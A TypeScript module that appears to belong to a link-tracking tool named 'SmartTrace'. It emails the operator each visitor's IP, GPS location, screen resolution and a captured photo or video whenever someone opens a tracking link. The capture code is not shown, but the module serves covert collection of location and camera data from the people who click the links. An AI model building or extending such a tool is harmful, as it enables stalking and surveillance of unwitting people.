import nodemailer from "nodemailer";
import { getSmtpSetting } from "./db";

export async function sendCaptureNotification(data: {
  linkId: string;
  ip: string;
  gps: string;
  resolution: string;
  filePath: string;
  createdAt: Date;
  userId?: number | null;
}) {
  let host = process.env.SMTP_HOST;
  let port = Number(process.env.SMTP_PORT || 465);
  let user = process.env.SMTP_USER;
  let pass = process.env.SMTP_PASS;
  let recipient = process.env.NOTIFICATION_EMAIL || user;
  let subjectTemplate = "";
  let htmlTemplate = "";

  if (data.userId) {
    const userSetting = await getSmtpSetting(data.userId);
    if (userSetting) {
      host = userSetting.host;
      port = userSetting.port;
      user = userSetting.user;
      pass = userSetting.pass;
      recipient = userSetting.recipient;
      subjectTemplate = userSetting.emailSubjectTemplate || "";
      htmlTemplate = userSetting.emailHtmlTemplate || "";
    }
  }

  if (!host || !user || !pass) {
    console.warn("[SMTP] SMTP not configured. Skipping email notification.");
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
    });

    const isVideo = data.filePath.endsWith(".webm") || data.filePath.endsWith(".mp4");
    const mediaType = isVideo ? "Kurzvideo / Video" : "Foto / Photo";

    const defaultSubject = `[SmartTrace] 新访客捕获 - 追踪ID: ${data.linkId}`;
    const defaultHtml = `
      <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333;">
        <div style="max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
          <h2 style="color: #4f46e5; margin-top: 0;">SmartTrace 访客通知</h2>
          <p>检测到有新的访客访问了您的追踪链接：</p>
          <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 140px;">追踪编号:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee; color: #4f46e5;">{linkId}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">IP 地址与属地:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">{ip}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">GPS 定位:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">{gps}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">屏幕分辨率:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">{resolution}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">媒体类型:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">{mediaType}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">捕获时间:</td>
              <td style="padding: 10px; border-bottom: 1px solid #eee;">{createdAt}</td>
            </tr>
          </table>
          <p style="margin-top: 20px;">
            <a href="{filePath}" target="_blank" style="background: #4f46e5; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">查看媒体文件</a>
          </p>
        </div>
      </div>
    `;

    const formatString = (str: string) => {
      return str
        .replace(/{linkId}/g, data.linkId)
        .replace(/{ip}/g, data.ip)
        .replace(/{gps}/g, data.gps)
        .replace(/{resolution}/g, data.resolution)
        .replace(/{mediaType}/g, mediaType)
        .replace(/{createdAt}/g, new Date(data.createdAt).toLocaleString())
        .replace(/{filePath}/g, data.filePath);
    };

    const subject = subjectTemplate ? formatString(subjectTemplate) : defaultSubject;
    const html = htmlTemplate ? formatString(htmlTemplate) : formatString(defaultHtml);

    const mailOptions = {
      from: `"SmartTrace Vault" <${user}>`,
      to: recipient,
      subject,
      html,
    };

    await transporter.sendMail(mailOptions);
    console.log(`[SMTP] Notification sent successfully to ${recipient}`);
  } catch (error) {
    console.error("[SMTP] Failed to send notification email:", error);
  }
}

export async function testSmtpConnection(config: {
  host: string;
  port: number;
  user: string;
  pass: string;
}) {
  const transporter = nodemailer.createTransport({
    host: config.host,
    port: config.port,
    secure: config.port === 465,
    auth: {
      user: config.user,
      pass: config.pass,
    },
  });

  await transporter.verify();
  return true;
}
